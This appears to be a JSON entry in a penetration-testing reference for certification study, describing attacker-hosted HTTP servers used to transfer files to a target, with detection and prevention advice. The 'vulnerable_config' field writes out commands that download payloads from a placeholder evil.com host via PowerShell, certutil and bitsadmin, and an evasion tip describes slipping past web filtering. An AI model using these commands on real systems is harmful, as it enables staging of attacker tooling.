@@ -1,0 +1,108 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "php",
+    "pyftpdlib",
+    "python",
+    "ruby"
+  ],
+  "tags": [
+    "http-server",
+    "hosting"
+  ],
+  "category": "File Transfers",
+  "subcategory": "Web Servers",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "Check which interpreters exist on target",
+      "command": "which python3 python perl ruby php"
+    }
+  ],
+  "notes": "Quick attacker-side servers: `python3 -m http.server 8000`, `php -S 0.0.0.0:8000`, `ruby -run -e httpd . -p 8000`. For uploads use uploadserver or nginx PUT. The staple for ingress tool transfer.",
+  "references": [
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "nix-download",
+      "rel": "next",
+      "note": "Target pulls from this server."
+    },
+    {
+      "id": "win-ps-download",
+      "rel": "next",
+      "note": "Windows target pulls from this server."
+    }
+  ],
+  "id": "http-file-servers",
+  "name": "Hosting - Quick HTTP Servers",
+  "command": "python3 -m http.server 8000",
+  "description": "Serve the current directory over HTTP so a target can download from you. Use whichever interpreter is installed; uploadserver also accepts uploads.",
+  "variations": [
+    {
+      "label": "Python 3",
+      "command": "python3 -m http.server 8000"
+    },
+    {
+      "label": "Python 2",
+      "command": "python2.7 -m SimpleHTTPServer"
+    },
+    {
+      "label": "PHP",
+      "command": "php -S 0.0.0.0:8000"
+    },
+    {
+      "label": "Ruby",
+      "command": "ruby -run -ehttpd . -p8000"
+    },
+    {
+      "label": "Python upload server",
+      "command": "python3 -m uploadserver"
+    },
+    {
+      "label": "Python FTP server (upload-capable)",
+      "command": "sudo python3 -m pyftpdlib --port 21 --write"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "A quick attacker-side HTTP server (python -m http.server, php -S, Apache/nginx) hosts files for the target to download over HTTP - the most common staging method because outbound HTTP is nearly always allowed.",
+    "prerequisites": "An attacker host to run the server and the target able to reach it over the chosen HTTP port.",
+    "impact": "A staging point from which the target pulls tooling; pairs with any download method.",
+    "detection": "Outbound HTTP from the target to an unusual/external IP hosting files; the download tool's request and UA in proxy logs; new file on disk on the target side.",
+    "artifacts": "An outbound HTTP GET to the attacker's server; access-log entries on the attacker side; the fetched file on the target.",
+    "prevention": "[MITRE T1105 M1037 Filter Network Traffic] Use web content filtering to block risky file types (.exe) and whitelist domains (the module scenario shows GitHub/Dropbox/Drive blocked); [M1031 Network Intrusion Prevention] inspect and block transfers at IDS/IPS. Apply application control (WDAC/AppLocker) to block download cradles/LOLBins, and AV/EDR to catch known tooling.",
+    "evasion": "Serve over HTTPS on 443 from a domain that passes web filtering; the server itself is attacker-side so target-visible signal is just the download.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  }
+}
